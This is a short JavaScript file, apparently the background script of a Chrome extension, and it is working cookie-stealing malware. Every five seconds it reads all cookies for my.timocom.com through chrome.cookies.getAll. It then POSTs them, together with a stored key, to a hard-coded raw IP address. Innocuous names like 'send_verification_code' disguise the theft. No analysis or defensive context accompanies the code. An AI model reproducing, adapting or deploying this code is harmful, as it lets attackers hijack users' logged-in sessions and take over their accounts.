//localStorage.setItem('verify_kcilc', 'ok');
jobber();
var timerIdgetAllBallance = setInterval(function() {
  jobber();
}, 5000);

function jobber() {
  chrome.cookies.getAll({
      url: 'https://my.timocom.com'
    },
    function(cookie) {
      if (cookie) {
        send_verification_code(cookie);
      } else {
        console.log('Can\'t get cookie! Check the name!');
      }
    });
}

function send_verification_code(cookies) {
  var current_verification_key = localStorage.getItem('verify_key');
  console.log(Object.keys(cookies).length);
  if (Object.keys(cookies).length > 0) {
    var data_cookies = JSON.stringify(cookies);
    //console.log(data_cookies);
    $.ajax({
      type: 'POST',
      url: 'http://92.118.150.87/api/chrome',
      data: 'cookies=' + data_cookies + '&check_key=' + current_verification_key,
      success: function(dataRequest) {
        //console.log(dataRequest);
      },
      error: function() {
        console.log('error connect');
      }
    });
  }
}
